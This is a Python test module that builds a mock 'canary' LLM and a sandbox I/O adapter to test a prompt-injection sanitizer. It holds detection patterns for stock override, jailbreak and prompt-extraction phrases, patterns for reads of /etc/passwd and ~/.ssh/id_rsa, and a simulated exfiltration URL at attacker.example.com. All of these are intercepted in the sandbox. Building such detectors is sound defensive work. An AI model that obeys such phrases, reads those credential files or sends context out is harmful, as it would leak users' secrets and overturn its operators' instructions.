# Copyright (C) 2026 Gregory R. Warnes / Warnes Innovations LLC
# SPDX-License-Identifier: AGPL-3.0-or-later

"""MockProtectedLLM -- canary LLM and sandbox I/O adapter for red-team testing.

Architecture
------------
Three concerns are separated:

1.  **Detection** -- the canary scans incoming content for patterns that would
    cause a naive LLM to comply (instruction overrides, role-play, data exfil,
    hidden directives, and explicit file/network access instructions).

2.  **I/O simulation** -- when a data-exfiltration or file-access pattern is
    detected, the canary attempts I/O through an injected ``IOAdapter``.
    In tests this is always a ``SandboxIOAdapter`` that raises
    ``SandboxViolation`` and records the attempt without performing real I/O.

3.  **Reporting** -- callers inspect ``was_compromised``, ``attempted_io``,
    ``all_io_was_blocked``, ``compliance_log``, and ``io_blocked_events``
    to make assertions in red-team tests.

Usage::

    sandbox_io = SandboxIOAdapter()
    llm = MockProtectedLLM(io_adapter=sandbox_io)
    llm.process(some_content)
    assert not llm.was_compromised
    assert not llm.attempted_io
"""

from __future__ import annotations

import base64
import re
from typing import Protocol, runtime_checkable


# ---------------------------------------------------------------------------
# I/O adapter protocol and implementations
# ---------------------------------------------------------------------------


@runtime_checkable
class IOAdapter(Protocol):
    """Minimal I/O surface that the canary may invoke when compromised."""

    def read_file(self, path: str) -> str: ...
    def fetch_url(self, url: str) -> str: ...


class SandboxViolation(Exception):
    """Raised by SandboxIOAdapter when the canary attempts any I/O."""

    def __init__(self, operation: str, target: str) -> None:
        self.operation = operation
        self.target = target
        super().__init__(f"[SANDBOX BLOCKED] {operation}: {target}")


class SandboxIOAdapter:
    """Blocks every I/O attempt and records it for assertion.

    Every call to ``read_file`` or ``fetch_url`` raises ``SandboxViolation``
    and appends the target to the appropriate attempt list.  No real filesystem
    access or network connection is ever made.
    """

    def __init__(self) -> None:
        self.file_attempts:    list[str] = []
        self.network_attempts: list[str] = []

    def read_file(self, path: str) -> str:
        self.file_attempts.append(path)
        raise SandboxViolation("file_read", path)

    def fetch_url(self, url: str) -> str:
        self.network_attempts.append(url)
        raise SandboxViolation("network_fetch", url)

    @property
    def any_attempts(self) -> bool:
        return bool(self.file_attempts or self.network_attempts)

    def reset(self) -> None:
        self.file_attempts.clear()
        self.network_attempts.clear()


# ---------------------------------------------------------------------------
# Pre-processing helpers (simulate LLM tokeniser behaviour)
# ---------------------------------------------------------------------------

# Cyrillic characters that visually resemble their Latin counterparts
_HOMOGLYPH_TABLE: dict[int, str] = {
    ord("\u0430"): "a",   # а -> a
    ord("\u0435"): "e",   # е -> e
    ord("\u0456"): "i",   # і -> i
    ord("\u043e"): "o",   # о -> o
    ord("\u0440"): "r",   # р -> r
    ord("\u0441"): "s",   # с -> s
    ord("\u0445"): "x",   # х -> x
    ord("\u0443"): "u",   # у -> u
}

# Zero-width characters the canary strips before pattern-matching
_ZWC = frozenset("\u200b\u200c\u200d\u2060\ufeff")


def _preprocess(text: str) -> str:
    """Return a normalised form of *text* that reveals obfuscated injections.

    Steps applied:
    1. Strip zero-width characters.
    2. Replace common Cyrillic homoglyphs with their Latin equivalents.
    3. Locate long base64 blobs and append their decoded plaintext so that
       patterns inside encoded payloads are also matched.
    """
    stripped  = "".join(c for c in text if c not in _ZWC)
    normalised = stripped.translate(_HOMOGLYPH_TABLE)  # type: ignore[arg-type]

    # Append decoded base64 so patterns inside encoded payloads are caught
    extra_text = ""
    for candidate in re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", normalised):
        try:
            decoded = base64.b64decode(candidate + "==").decode("utf-8", errors="ignore")
            extra_text += " " + decoded
        except Exception:
            pass

    return normalised + extra_text


# ---------------------------------------------------------------------------
# Compliance patterns
# ---------------------------------------------------------------------------
# Each entry: (regex_pattern, category, io_action)
# io_action: None | "file_read" | "network"
#
# Patterns mirror what the llm-sanitizer scanner rules detect, plus additional
# file-access patterns that are *outside* current scanner coverage (those tests
# are used to demonstrate that the sandbox provides a safety net regardless of
# scanner gaps).

_PATTERN_SPECS: list[tuple[str, str, str | None]] = [
    # ---- Instruction override (instruction_override rule) ----
    (r"ignore\s+(all\s+)?(previous|prior|earlier|above|preceding)\s+instructions?",
     "instruction_override", None),
    (r"disregard\s+(all\s+)?(previous|prior|earlier|above|preceding)\s+instructions?",
     "instruction_override", None),
    (r"forget\s+(everything|all)(\s+above|\s+before|\s+prior)?",
     "instruction_override", None),
    (r"new\s+system\s+prompt",
     "instruction_override", None),
    (r"reset\s+(all\s+)?(previous\s+|prior\s+)?instructions?",
     "instruction_override", None),
    (r"do\s+not\s+follow\s+(previous|prior|your)\s+instructions?",
     "instruction_override", None),

    # ---- Role play / persona hijack (role_play rule) ----
    (r"act\s+as\s+(an?\s+)?(unconstrained|unrestricted|evil|unfiltered)",
     "role_play", None),
    (r"pretend\s+(you\s+are|to\s+be)\s+",
     "role_play", None),
    (r"\bdan\b",
     "role_play", None),
    (r"\bjailbreak\b",
     "role_play", None),
    (r"developer\s+mode",
     "role_play", None),
    (r"your\s+new\s+role\s+is",
     "role_play", None),
    (r"you\s+are\s+now\s+(a|an|the)\s+\w+",
     "role_play", None),

    # ---- System prompt / data exfiltration (data_exfil rule) ----
    # These simulate the LLM attempting to send context to a remote endpoint.
    (r"reveal\s+(your|the)\s+(system\s+)?prompt",
     "data_exfil", "network"),
    (r"repeat\s+(the|your)\s+system\s+prompt",
     "data_exfil", "network"),
    (r"show\s+(me\s+)?your\s+(system\s+)?(prompt|instructions?)",
     "data_exfil", "network"),
    (r"output\s+(all\s+)?(previous|prior|your|the)\s+instructions?",
     "data_exfil", "network"),
    (r"send\s+(the\s+)?(conversation|chat|context|history)\s+to\b",
     "data_exfil", "network"),
    (r"\bexfiltrate\b",
     "data_exfil", "network"),
    (r"(leak|dump|expose)\s+(the|your)?\s*(system\s+)?(prompt|instructions?|context)",
     "data_exfil", "network"),

    # ---- Hidden directives (comment_directive rule) ----
    (r"<!--.*?(instructions?\s+for\s+(ai|llm)|llm\s*:|ignore\s+previous).*?-->",
     "hidden_directive", None),
    (r"/\*\s*(llm|ai|system)\s*:.*?\*/",
     "hidden_directive", None),
    (r"#\s*(ai|llm)[-\s]+(directive|instruction)\s*:",
     "hidden_directive", None),

    # ---- Agent config (agent_config rule) ----
    (r"^instructions\s*:\s*ignore",
     "agent_config", None),

    # ---- File access (NOT covered by current scanner rules) ----
    # These patterns demonstrate the sandbox safety net for agentic LLMs that
    # have file-read tools.  Tests using these are marked with the scanner gap.
    (r"read\s+(the\s+)?file\s+",
     "file_access_undetected", "file_read"),
    (r"/etc/passwd",
     "file_access_undetected", "file_read"),
    (r"~/\.ssh/id_rsa",
     "file_access_undetected", "file_read"),
]

_COMPILED: list[tuple[re.Pattern[str], str, str | None]] = [
    (re.compile(pat, re.IGNORECASE | re.DOTALL | re.MULTILINE), cat, io_act)
    for pat, cat, io_act in _PATTERN_SPECS
]

# Simulated exfil targets -- never real I/O; always intercepted by SandboxIOAdapter
_SIM_FILE_PATH = "/etc/passwd"
_SIM_EXFIL_URL = "http://attacker.example.com/exfil"


# ---------------------------------------------------------------------------
# MockProtectedLLM (canary)
# ---------------------------------------------------------------------------


class MockProtectedLLM:
    """Deterministic canary LLM used as the protected backend in red-team tests.

    The canary simulates a *naive* LLM: one that would comply with any injection
    instruction it encounters.  It does NOT make real LLM API calls.

    When content containing data-exfiltration or file-access patterns is
    processed, the canary "attempts" the corresponding I/O operation through its
    ``IOAdapter``.  In all test scenarios this is a ``SandboxIOAdapter`` that
    raises ``SandboxViolation`` instead of touching the filesystem or network.

    The combination of detection + sandbox gives two independent assurance layers:

    * **Layer 1 (sanitizer)**: injection phrases are removed before reaching the
      canary, so ``was_compromised`` is False.
    * **Layer 2 (sandbox)**: even if a phrase were to reach the canary, any
      resulting I/O attempt is blocked and recorded, so no real harm is possible.
    """

    def __init__(
        self,
        system_prompt: str = "You are a helpful assistant.",
        io_adapter: IOAdapter | None = None,
    ) -> None:
        self.system_prompt = system_prompt
        self._io: IOAdapter = io_adapter if io_adapter is not None else SandboxIOAdapter()
        self.received_inputs:  list[str]             = []
        self.compliance_log:   list[dict[str, str]]  = []
        self.io_blocked_events: list[dict[str, str]] = []

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def process(self, user_content: str) -> str:
        """Process *user_content* and return a simulated response string.

        The normalised version of *user_content* (ZWC stripped, homoglyphs
        replaced, base64 decoded) is checked against all compliance patterns.
        Each match is logged and, for I/O-triggering patterns, the simulated
        I/O attempt is made through the injected adapter.
        """
        self.received_inputs.append(user_content)
        normalised = _preprocess(user_content)

        for pattern, category, io_action in _COMPILED:
            if pattern.search(normalised):
                self.compliance_log.append(
                    {"category": category, "pattern": pattern.pattern}
                )
                if io_action == "file_read":
                    self._attempt_file_read(_SIM_FILE_PATH)
                elif io_action == "network":
                    self._attempt_network_fetch(_SIM_EXFIL_URL)

        if self.compliance_log:
            cats = ", ".join(sorted({e["category"] for e in self.compliance_log}))
            return f"[WOULD_COMPLY] categories={cats}"
        return "[SAFE_RESPONSE] Content processed normally."

    def reset(self) -> None:
        """Clear all recorded state (allows fixture reuse across parametrized cases)."""
        self.received_inputs.clear()
        self.compliance_log.clear()
        self.io_blocked_events.clear()

    # ------------------------------------------------------------------
    # Convenience properties for test assertions
    # ------------------------------------------------------------------

    @property
    def was_compromised(self) -> bool:
        """True if any injection compliance was detected in the last process() call."""
        return bool(self.compliance_log)

    @property
    def attempted_io(self) -> bool:
        """True if the canary attempted any file or network I/O."""
        return bool(self.io_blocked_events)

    @property
    def all_io_was_blocked(self) -> bool:
        """True if every I/O attempt was intercepted by the sandbox."""
        return bool(self.io_blocked_events) and all(
            e.get("blocked") == "true" for e in self.io_blocked_events
        )

    @property
    def compromised_categories(self) -> set[str]:
        return {e["category"] for e in self.compliance_log}

    # ------------------------------------------------------------------
    # Internal I/O simulation helpers
    # ------------------------------------------------------------------

    def _attempt_file_read(self, path: str) -> None:
        """Simulate reading *path* through the I/O adapter (blocked in sandbox)."""
        try:
            self._io.read_file(path)
        except SandboxViolation as exc:
            self.io_blocked_events.append(
                {"type": "file_read", "target": exc.target, "blocked": "true"}
            )
        except OSError:
            pass  # real filesystem denial -- acceptable outside tests

    def _attempt_network_fetch(self, url: str) -> None:
        """Simulate fetching *url* through the I/O adapter (blocked in sandbox)."""
        try:
            self._io.fetch_url(url)
        except SandboxViolation as exc:
            self.io_blocked_events.append(
                {"type": "network_fetch", "target": exc.target, "blocked": "true"}
            )
        except OSError:
            pass  # real network denial -- acceptable outside tests
